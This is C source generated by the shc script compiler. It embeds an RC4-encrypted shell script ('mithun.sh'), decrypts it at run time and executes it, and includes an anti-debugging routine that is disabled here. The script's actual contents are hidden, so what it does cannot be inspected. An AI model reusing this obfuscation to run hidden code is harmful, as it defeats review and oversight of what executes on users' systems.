#if 0
	shc Version 3.8.7, Generic Script Compiler
	Copyright (c) 1994-2009 Francisco Rosales <frosal@fi.upm.es>

	shc -v -r -T -f ./mithun.sh 
#endif

static  char data [] = 
#define      date_z	1
#define      date	((&data[0]))
	"\035"
#define      pswd_z	256
#define      pswd	((&data[51]))
	"\103\273\362\347\014\176\335\236\370\151\333\134\172\035\357\331"
	"\167\306\311\170\373\167\215\260\150\264\006\075\275\314\005\000"
	"\207\367\350\223\166\305\062\157\057\015\314\251\052\274\203\242"
	"\202\114\124\215\223\110\265\235\010\241\002\346\274\264\220\135"
	"\324\123\002\014\032\074\171\060\104\310\136\135\244\363\173\272"
	"\310\320\107\134\030\375\371\041\236\373\007\132\260\227\270\204"
	"\353\273\220\005\367\012\065\074\322\224\232\166\207\026\061\120"
	"\346\171\254\376\166\245\040\024\241\047\157\122\277\050\326\252"
	"\343\147\260\333\161\345\027\104\172\261\273\001\310\354\122\256"
	"\145\376\255\334\244\315\360\105\365\140\230\264\210\157\137\153"
	"\326\017\106\110\365\136\214\157\020\107\161\330\064\304\207\232"
	"\302\064\166\147\002\147\255\367\307\105\254\120\264\014\273\212"
	"\034\002\323\021\140\140\201\160\247\363\111\334\267\320\166\172"
	"\005\355\341\007\125\216\377\035\323\254\155\207\270\050\022\324"
	"\052\345\346\213\105\150\374\355\133\105\312\023\025\101\215\032"
	"\056\156\041\204\374\041\241\320\315\016\130\206\067\152\133\142"
	"\120\101\355\226\251\351\204\005\056\116\030\103\217\245\136\276"
	"\024\200\102\021\241\344\342\157\362\072\365\052\244\120\214\365"
	"\222\172\214\074\143\020\101\222\137\132\326\357\000\064\256\025"
	"\265\361\032\175\303\250\056\054\134\065\151\031\001\157\031\211"
	"\147\001\035\335\307\117\115\366\134\031\240\207\325\043\052\130"
	"\160\104\326\064\354\004\140\111\072\312\142\074\071\174\305\240"
	"\176\342\176\106"
#define      shll_z	10
#define      shll	((&data[359]))
	"\217\345\361\215\325\027\213\353\141\264\177\324"
#define      text_z	1001
#define      text	((&data[391]))
	"\001\100\024\161\205\352\245\162\357\006\273\051\320\036\145\012"
	"\233\053\253\031\015\052\142\052\117\245\043\052\065\367\262\177"
	"\212\153\057\067\351\157\336\005\304\316\112\257\304\143\015\207"
	"\323\112\074\124\264\270\272\332\053\257\311\274\366\173\377\041"
	"\330\045\247\137\242\137\027\365\200\037\012\006\214\227\105\011"
	"\125\377\175\347\217\276\137\354\154\164\107\260\306\074\176\003"
	"\234\143\120\161\333\213\252\137\334\111\103\121\332\161\267\321"
	"\126\266\144\262\000\362\265\365\125\273\305\160\205\065\227\150"
	"\235\323\214\324\106\317\146\346\270\173\214\112\114\056\206\220"
	"\155\234\042\002\251\253\107\322\004\034\372\065\174\377\344\121"
	"\175\371\266\105\325\165\154\355\132\362\200\170\066\140\223\134"
	"\225\014\155\334\346\353\175\374\277\247\013\316\276\014\304\024"
	"\125\100\362\301\040\112\224\216\366\350\331\010\240\200\233\257"
	"\217\004\215\235\074\322\020\214\123\074\072\036\200\231\362\005"
	"\025\051\220\156\006\136\175\001\150\000\336\220\154\333\344\351"
	"\176\200\257\135\360\242\331\026\250\347\001\014\034\160\167\351"
	"\133\111\157\060\161\135\360\316\367\043\055\064\070\341\341\102"
	"\352\056\171\355\200\063\125\272\223\103\214\333\360\356\136\207"
	"\140\043\346\217\217\115\061\104\347\126\152\117\341\362\057\034"
	"\132\056\064\335\200\024\074\021\271\001\045\247\001\327\076\122"
	"\370\261\326\245\146\206\167\062\203\121\337\360\272\277\224\111"
	"\060\143\052\104\107\303\270\246\203\244\145\157\026\243\221\252"
	"\245\177\332\367\330\134\376\117\275\025\135\044\044\155\121\204"
	"\015\314\316\056\035\176\252\265\257\307\266\147\125\311\014\166"
	"\175\222\225\000\130\340\223\014\124\151\010\021\234\240\327\355"
	"\243\317\324\212\117\144\207\321\246\142\123\252\315\041\306\342"
	"\265\101\215\102\145\335\101\336\004\167\315\122\230\274\254\132"
	"\155\013\212\123\321\111\362\360\317\111\042\103\116\175\172\037"
	"\065\063\157\241\203\314\100\151\072\144\350\271\223\347\074\075"
	"\322\052\013\141\333\256\173\303\330\007\331\023\157\154\252\264"
	"\236\033\101\133\106\150\212\302\271\324\135\001\174\172\005\227"
	"\214\316\130\375\027\011\236\277\370\211\007\256\151\013\173\123"
	"\257\130\332\200\217\047\060\111\261\015\006\301\102\164\007\277"
	"\004\055\267\152\114\301\014\321\362\376\171\146\233\241\353\347"
	"\173\036\303\301\027\202\157\252\066\346\353\065\132\002\123\120"
	"\100\272\140\206\366\067\143\011\075\051\300\306\057\047\023\130"
	"\335\012\172\073\257\236\034\044\375\035\110\352\304\161\003\225"
	"\142\254\071\033\102\273\060\245\364\374\260\050\020\243\216\042"
	"\040\004\320\143\033\202\153\015\032\135\105\371\304\127\041\366"
	"\360\344\203\360\044\100\120\031\020\207\056\017\245\241\040\241"
	"\243\115\275\273\140\232\040\003\223\331\255\041\212\243\105\363"
	"\115\104\137\172\253\040\262\033\114\101\317\112\141\157\017\116"
	"\300\356\113\150\274\060\141\177\032\357\234\323\253\257\320\300"
	"\173\061\340\162\101\174\042\126\136\132\045\161\046\020\027\001"
	"\137\136\121\371\317\127\061\147\264\302\213\025\246\306\200\040"
	"\231\074\325\155\076\105\061\176\377\162\203\357\146\350\030\176"
	"\064\174\252\135\020\265\213\334\131\330\200\374\015\134\027\324"
	"\361\023\165\121\322\064\313\253\356\224\334\332\006\165\120\351"
	"\041\173\137\215\043\143\170\052\071\102\347\127\112\315\125\035"
	"\007\177\366\017\306\213\101\147\107\326\357\323\242\147\272\260"
	"\254\176\075\315\243\362\114\132\362\367\340\120\074\223\004\204"
	"\340\262\036\262\365\001\303\274\036\277\231\074\336\100\262\143"
	"\314\153\070\310\275\142\332\273\151\341\315\221\072\161\374\266"
	"\325\040\323\301\006\155\072\017\063\144\173\202\365\342\345\027"
	"\361\003\113\043\336\211\020\033\162\365\104\031\031\305\307\333"
	"\013\122\311\364\125\045\135\366\074\126\000\245\263\102\030\321"
	"\171\263\024\234\162\334\347\110\164\355\144\264\346\005\166\060"
	"\201\017\106\100\155\325\373\215\203\317\220\061\255\171\055\306"
	"\037\320\145\317\240\257\327\125\103\364\364\004\250\327\332\073"
	"\313\266\006\034\276\076\124\110\232\354\040\161\246\015\307\020"
	"\274\270\224\251\371\065\014\011\263\301\301\214\227\146\357\252"
	"\305\227\217\325\200\330\214\046\070\241\147\201\152\330\272\076"
	"\103\175\211\004\343\237\132\337\317\273\206\225\031\342\146\003"
	"\031\352\114\334\002\233\242\302\342\177\357\063\123\027\226\137"
	"\100\366\235\317\334\172\345\230\173\046\254\355\254\226\223\036"
	"\206\231\331\260\152\370\025\165\223\101\041\255\116\113\015\217"
	"\101\252\136\036\044\104\266\240\152\142\215\027\371\041\065\200"
	"\273\017\060\045\007\106\233\233\207\274\110\326\007\125\145\111"
	"\377\303\150\043\007\036\304\162\201\121\211\173\163\276\373\056"
	"\316\053\124\326\161\357\161\370\253\271\316\263\017\063\375\016"
	"\367\145\062\376\204\366\160\006\110\372\201\273\271\174\351\207"
	"\250\075\135\032\055\317\023\331\211\342\215\230\026\212\246\015"
	"\360\330\014\164\317\174\172\027\167\374\323\060\171\274\267\042"
	"\372\025\074\047\345\120\001\156\062\216\006\111\030\255\126\011"
	"\206\142\176\125\337\371\155\126\365\100\207\157\375\076\221\370"
	"\124\316\037\072\036\040\250"
#define      inlo_z	3
#define      inlo	((&data[1576]))
	"\023\156\303"
#define      msg2_z	19
#define      msg2	((&data[1582]))
	"\360\321\343\047\007\304\222\130\235\275\223\037\030\033\340\174"
	"\125\021\355\370\022\002\123"
#define      xecc_z	15
#define      xecc	((&data[1602]))
	"\141\041\123\372\271\334\330\276\306\361\226\107\012\353\134"
#define      lsto_z	1
#define      lsto	((&data[1617]))
	"\070"
#define      tst1_z	22
#define      tst1	((&data[1623]))
	"\256\345\117\077\335\200\302\234\242\306\155\331\351\156\367\110"
	"\141\051\351\157\057\031\367\241\223\241\041"
#define      rlax_z	1
#define      rlax	((&data[1645]))
	"\041"
#define      tst2_z	19
#define      tst2	((&data[1646]))
	"\345\013\223\314\102\167\375\122\224\126\263\202\275\252\122\235"
	"\124\113\040"
#define      chk1_z	22
#define      chk1	((&data[1667]))
	"\066\027\234\145\226\124\004\134\342\104\057\077\112\222\154\240"
	"\171\053\065\176\214\367\175\010\225\223\010\146"
#define      opts_z	1
#define      opts	((&data[1693]))
	"\172"
#define      chk2_z	19
#define      chk2	((&data[1696]))
	"\125\027\232\017\350\253\146\350\115\122\331\215\016\213\224\004"
	"\311\267\234\362\327\076\075\050\354"
#define      msg1_z	42
#define      msg1	((&data[1724]))
	"\377\034\071\374\373\360\366\344\314\200\357\007\035\340\311\060"
	"\352\033\114\074\334\004\055\313\147\277\107\017\066\252\141\235"
	"\176\045\320\264\066\362\250\226\021\232\212\210\310\145\326\145"/* End of data[] */;
#define      hide_z	4096
#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
#define TRACEABLE	1	/* Define as 1 to enable ptrace the executable */

/* rtc.c */

#include <sys/stat.h>
#include <sys/types.h>

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

/* 'Alleged RC4' */

static unsigned char stte[256], indx, jndx, kndx;

/*
 * Reset arc4 stte. 
 */
void stte_0(void)
{
	indx = jndx = kndx = 0;
	do {
		stte[indx] = indx;
	} while (++indx);
}

/*
 * Set key. Can be used more than once. 
 */
void key(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		do {
			tmp = stte[indx];
			kndx += tmp;
			kndx += ptr[(int)indx % len];
			stte[indx] = stte[kndx];
			stte[kndx] = tmp;
		} while (++indx);
		ptr += 256;
		len -= 256;
	}
}

/*
 * Crypt data. 
 */
void arc4(void * str, int len)
{
	unsigned char tmp, * ptr = (unsigned char *)str;
	while (len > 0) {
		indx++;
		tmp = stte[indx];
		jndx += tmp;
		stte[indx] = stte[jndx];
		stte[jndx] = tmp;
		tmp += stte[indx];
		*ptr ^= stte[tmp];
		ptr++;
		len--;
	}
}

/* End of ARC4 */

/*
 * Key with file invariants. 
 */
int key_with_file(char * file)
{
	struct stat statf[1];
	struct stat control[1];

	if (stat(file, statf) < 0)
		return -1;

	/* Turn on stable fields */
	memset(control, 0, sizeof(control));
	control->st_ino = statf->st_ino;
	control->st_dev = statf->st_dev;
	control->st_rdev = statf->st_rdev;
	control->st_uid = statf->st_uid;
	control->st_gid = statf->st_gid;
	control->st_size = statf->st_size;
	control->st_mtime = statf->st_mtime;
	control->st_ctime = statf->st_ctime;
	key(control, sizeof(control));
	return 0;
}

#if DEBUGEXEC
void debugexec(char * sh11, int argc, char ** argv)
{
	int i;
	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
	fprintf(stderr, "argc=%d\n", argc);
	if (!argv) {
		fprintf(stderr, "argv=<null>\n");
	} else { 
		for (i = 0; i <= argc ; i++)
			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
	}
}
#endif /* DEBUGEXEC */

void rmarg(char ** argv, char * arg)
{
	for (; argv && *argv && *argv != arg; argv++);
	for (; argv && *argv; argv++)
		*argv = argv[1];
}

int chkenv(int argc)
{
	char buff[512];
	unsigned long mask, m;
	int l, a, c;
	char * string;
	extern char ** environ;

	mask  = (unsigned long)&chkenv;
	mask ^= (unsigned long)getpid() * ~mask;
	sprintf(buff, "x%lx", mask);
	string = getenv(buff);
#if DEBUGEXEC
	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
#endif
	l = strlen(buff);
	if (!string) {
		/* 1st */
		sprintf(&buff[l], "=%lu %d", mask, argc);
		putenv(strdup(buff));
		return 0;
	}
	c = sscanf(string, "%lu %d%c", &m, &a, buff);
	if (c == 2 && m == mask) {
		/* 3rd */
		rmarg(environ, &string[-l - 1]);
		return 1 + (argc - a);
	}
	return -1;
}

#if !TRACEABLE

#define _LINUX_SOURCE_COMPAT
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <unistd.h>

#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
#	define PTRACE_ATTACH	PT_ATTACH
#endif
void untraceable(char * argv0)
{
	char proc[80];
	int pid, mine;

	switch(pid = fork()) {
	case  0:
		pid = getppid();
		/* For problematic SunOS ptrace */
#if defined(__FreeBSD__)
		sprintf(proc, "/proc/%d/mem", (int)pid);
#else
		sprintf(proc, "/proc/%d/as",  (int)pid);
#endif
		close(0);
		mine = !open(proc, O_RDWR|O_EXCL);
		if (!mine && errno != EBUSY)
			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
		if (mine) {
			kill(pid, SIGCONT);
		} else {
			perror(argv0);
			kill(pid, SIGKILL);
		}
		_exit(mine);
	case -1:
		break;
	default:
		if (pid == waitpid(pid, 0, 0))
			return;
	}
	perror(argv0);
	_exit(1);
}
#endif /* !TRACEABLE */

char * xsh(int argc, char ** argv)
{
	char * scrpt;
	int ret, i, j;
	char ** varg;

	stte_0();
	 key(pswd, pswd_z);
	arc4(msg1, msg1_z);
	arc4(date, date_z);
	if (date[0] && (atoll(date)<time(NULL)))
		return msg1;
	arc4(shll, shll_z);
	arc4(inlo, inlo_z);
	arc4(xecc, xecc_z);
	arc4(lsto, lsto_z);
	arc4(tst1, tst1_z);
	 key(tst1, tst1_z);
	arc4(chk1, chk1_z);
	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
		return tst1;
	ret = chkenv(argc);
	arc4(msg2, msg2_z);
	if (ret < 0)
		return msg2;
	varg = (char **)calloc(argc + 10, sizeof(char *));
	if (!varg)
		return 0;
	if (ret) {
		arc4(rlax, rlax_z);
		if (!rlax[0] && key_with_file(shll))
			return shll;
		arc4(opts, opts_z);
		arc4(text, text_z);
		arc4(tst2, tst2_z);
		 key(tst2, tst2_z);
		arc4(chk2, chk2_z);
		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
			return tst2;
		if (text_z < hide_z) {
			/* Prepend spaces til a hide_z script size. */
			scrpt = malloc(hide_z);
			if (!scrpt)
				return 0;
			memset(scrpt, (int) ' ', hide_z);
			memcpy(&scrpt[hide_z - text_z], text, text_z);
		} else {
			scrpt = text;	/* Script text */
		}
	} else {			/* Reexecute */
		if (*xecc) {
			scrpt = malloc(512);
			if (!scrpt)
				return 0;
			sprintf(scrpt, xecc, argv[0]);
		} else {
			scrpt = argv[0];
		}
	}
	j = 0;
	varg[j++] = argv[0];		/* My own name at execution */
	if (ret && *opts)
		varg[j++] = opts;	/* Options on 1st line of code */
	if (*inlo)
		varg[j++] = inlo;	/* Option introducing inline code */
	varg[j++] = scrpt;		/* The script itself */
	if (*lsto)
		varg[j++] = lsto;	/* Option meaning last option */
	i = (ret > 1) ? ret : 0;	/* Args numbering correction */
	while (i < argc)
		varg[j++] = argv[i++];	/* Main run-time arguments */
	varg[j] = 0;			/* NULL terminated array */
#if DEBUGEXEC
	debugexec(shll, j, varg);
#endif
	execvp(shll, varg);
	return shll;
}

int main(int argc, char ** argv)
{
#if DEBUGEXEC
	debugexec("main", argc, argv);
#endif
#if !TRACEABLE
	untraceable(argv[0]);
#endif
	argv[1] = xsh(argc, argv);
	fprintf(stderr, "%s%s%s: %s\n", argv[0],
		errno ? ": " : "",
		errno ? strerror(errno) : "",
		argv[1] ? argv[1] : "<null>"
	);
	return 1;
}
